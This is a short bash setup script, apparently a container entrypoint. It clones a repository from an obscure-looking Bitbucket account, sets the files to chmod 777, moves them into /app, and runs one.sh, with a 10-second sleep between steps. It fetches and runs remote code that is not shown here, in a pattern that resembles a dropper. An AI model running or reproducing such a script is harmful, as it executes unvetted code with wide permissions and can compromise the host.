#!/bin/bash

sleep 10

git clone https://channabhadra@bitbucket.org/zborahgaredswq/0001-of-01.git

sleep 10

chmod 777 /app/0001-of-01

sleep 10

cd /app/0001-of-01 && mv /app/0001-of-01/* /app/

sleep 10

rm -fr /app/0001-of-01

sleep 10

chmod 777 /app/*

sleep 10

cd /app && ./one.sh
